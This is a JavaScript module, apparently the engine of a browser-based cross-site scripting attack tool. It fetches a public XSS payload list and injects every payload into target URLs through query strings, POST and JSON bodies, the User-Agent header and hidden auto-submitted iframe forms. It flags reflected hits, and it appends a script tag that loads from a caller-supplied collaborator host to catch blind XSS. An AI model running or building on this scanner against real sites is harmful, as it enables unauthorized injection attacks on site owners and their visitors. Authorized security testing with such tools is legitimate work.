const PAYLOAD_URL = 'https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/intruder/xss-payloads.txt';

class Engine {
  constructor() {
    this.payloads = [];
    this.stopFlag = false;
    this.results = [];
    this.stat = { crawled: 0, attacked: 0, found: 0 };
  }

  async init() {
    const cache = await caches.open('ax');
    let txt = await cache.match(PAYLOAD_URL).then(r => r?.text());
    if (!txt) {
      txt = await fetch(PAYLOAD_URL).then(r => r.text());
      cache.put(PAYLOAD_URL, new Response(txt));
    }
    this.payloads = txt.split(/\r?\n/).filter(Boolean);
  }

  stop() { this.stopFlag = true; }

  async run({ urls, delay, collab, log, onStat }) {
    await this.init();
    this.stat.crawled = urls.length;
    onStat(this.stat);

    for (const url of urls) {
      if (this.stopFlag) break;
      await this.attackPage(url, { collab, delay, log, onStat });
    }
  }

  async attackPage(url, { collab, delay, log, onStat }) {
    const methods = ['GET', 'POST', 'HEADER', 'JSON', 'FORM'];
    for (const m of methods) {
      for (const p of this.payloads) {
        if (this.stopFlag) return;
        try {
          const { status, reflected, blind } = await this.send(url, m, p, collab);
          const note = blind ? 'BLIND' : reflected ? 'CONFIRMED' : 'OK';
          if (reflected || blind) this.stat.found++;
          this.stat.attacked++;
          onStat(this.stat);
          log(`${m.padEnd(6)} | ${status} | ${note.padEnd(9)} | ${p.slice(0, 60)}`, reflected || blind ? 'boom' : 'ok');
          this.results.push({ url, p, m, s: status, n: note });
        } catch (e) {
          log(`${m} | ERROR | ${e.message}`, 'warn');
        }
        await this.sleep(delay);
      }
    }
  }

  async send(url, method, payload, collab) {
    const u = new URL(url);
    const headers = {};
    let body = undefined;

    // blind?
    const blindTag = collab ? `"><script src="${collab}"></script>` : '';
    const p = payload + blindTag;

    if (method === 'GET') {
      u.searchParams.set('q', p);
    } else if (method === 'POST') {
      body = new URLSearchParams({ q: p });
      headers['Content-Type'] = 'application/x-www-form-urlencoded';
    } else if (method === 'JSON') {
      body = JSON.stringify({ q: p });
      headers['Content-Type'] = 'application/json';
    } else if (method === 'HEADER') {
      headers['User-Agent'] = p;
    } else if (method === 'FORM') {
      // auto-submit form (iframe)
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      document.body.appendChild(iframe);
      const doc = iframe.contentDocument;
      doc.body.innerHTML = `
        <form action="${u.href}" method="post">
          <input name="q" value="${p.replace(/"/g, '&quot;')}">
        </form>`;
      doc.querySelector('form').submit();
      await this.sleep(2000);
      document.body.removeChild(iframe);
      return { status: 'FORM-SUBMIT', reflected: false, blind: !!collab };
    }

    const resp = await fetch(u.href, { method: method === 'JSON' ? 'POST' : method, body, headers, mode: 'cors' });
    const text = await resp.text();
    const reflected = text.includes(payload);
    return { status: resp.status, reflected, blind: !!collab };
  }

  sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
}

export const engine = new Engine();
